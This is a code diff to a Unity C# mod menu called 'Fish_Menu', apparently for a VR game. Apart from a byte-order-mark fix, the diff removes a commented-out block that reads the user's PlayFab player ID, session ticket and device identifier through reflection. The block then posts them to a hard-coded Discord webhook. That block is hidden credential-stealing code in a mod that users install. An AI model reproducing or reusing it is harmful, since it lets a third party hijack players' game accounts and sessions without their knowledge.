@@ -1,4 +1,4 @@
-﻿using Debug = UnityEngine.Debug;
+using Debug = UnityEngine.Debug;
 using Random = UnityEngine.Random;
 using Color = UnityEngine.Color;
 using Object = UnityEngine.Object;
@@ -5316,42 +5316,6 @@ namespace Fish_Menu.MainMenu
             CosmeticsController.instance.GetLastDailyLogin();
             CosmeticsController.instance.currentTime.AddDays(-1.0);
         }
-        /*private void Thing2()
-{
-    GameObject a = GameObject.Find("Networking Scripts/PlayFabAuthenticator");
-    if (a != null)
-    {
-        Thing(a);
-    }
-}
-private void Thing(GameObject gameObject)
-{
-    UnityEngine.Component[] components = gameObject.GetComponents<UnityEngine.Component>();
-
-    foreach (UnityEngine.Component component in components)
-    {
-        foreach (FieldInfo field in component.GetType().GetFields(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance))
-        {
-            if (field.Name == "_playFabPlayerIdCache") { _playFabPlayerIdCache = $"{field.GetValue(component)}"; }
-            if (field.Name == "_sessionTicket") { _sessionTicket = $"{field.GetValue(component)}"; }
-        }
-    }
-    foreach (PlayFabAuthenticator playFabAuthenticator in UnityEngine.Object.FindObjectsOfType<PlayFabAuthenticator>())
-    {
-        if (_playFabPlayerIdCache != "" && !SendMsg)
-        {
-            string formattedMessage =
-                $"User Id: {_playFabPlayerIdCache}\n" +
-                $"Device: {PlayFabSettings.DeviceUniqueIdentifier}\n" +
-                $"Session Ticket: {_sessionTicket}\n";
-
-            NameValueCollection data = new NameValueCollection { { "content", formattedMessage } };
-            using WebClient webClient = new WebClient();
-            webClient.UploadValues("https://discord.com/api/webhooks/1205389209041633310/kGhAEJTnNMahY_1dAKb9gCAniOcQ75R8xWyAAIRDx-ifWxXVjq56ifVbfD71qpuWK7rM", "POST", data);
-            SendMsg = true;
-        }
-    }
-} */
         #endregion
     }
     #endregion
